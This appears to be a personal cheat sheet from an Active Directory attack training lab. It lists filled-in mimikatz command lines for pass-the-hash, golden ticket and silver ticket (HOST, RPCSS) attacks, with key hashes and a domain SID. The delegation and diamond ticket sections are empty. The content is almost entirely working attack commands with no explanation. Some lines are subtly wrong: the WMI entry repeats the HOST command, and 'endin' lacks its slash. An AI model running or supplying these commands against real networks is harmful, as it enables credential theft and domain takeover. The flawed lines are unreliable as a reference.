# Tickets

## Pass The Hash
```
C:\AD\Tools\mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:dollarcorp.moneycorp.local /user:ciadmin /aes256:1bbe86f1b5285109dd1450b55ed8851c220b81cc187f9af64e4048ed25083879 /run:cmd" "exit"
```

## Golden Ticket

Access Filesistem:
```
C:\AD\Tools\mimikatz.exe "privilege::debug" "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848  /sid:S-1-5-21-719815819-3726368948-3917688648 /startoffset:0 endin:600 /renewmax:10080 /ptt" "exit"
```
```
Invoke-Mimi -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 endin:600 /renewmax:10080 /ptt"'
```

## Silver Ticket

Access HOST (schtask)
```
C:\AD\Tools\mimikatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:9407a301944bf60d059322952f56718a /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```
Access WMI:
```
C:\AD\Tools\mimikatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:9407a301944bf60d059322952f56718a /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```
```
C:\AD\Tools\mimikatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:9407a301944bf60d059322952f56718a /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

## Golden Ticket intra-forest domain
```
```

## Diamon Ticket
```
```

## Constrained Delegation
```
```

## Unconstrained Delegation
```
```
